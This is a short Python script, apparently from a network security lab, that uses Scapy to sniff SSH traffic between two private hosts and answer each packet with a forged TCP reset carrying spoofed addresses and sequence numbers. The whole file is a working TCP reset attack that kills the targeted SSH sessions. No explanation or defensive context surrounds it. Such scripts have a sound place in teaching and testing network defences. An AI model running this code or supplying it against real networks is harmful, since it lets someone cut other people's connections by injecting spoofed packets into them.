#!/usr/bin/python

from scapy.all import *

def do_rst(pkt):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags=0x14, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
    pkt = ip/tcp
    # ls(pkt)
    send(pkt,verbose=0)

pkt=sniff(filter='host 10.0.2.6 and host 10.0.2.7 and port 22',prn=do_rst)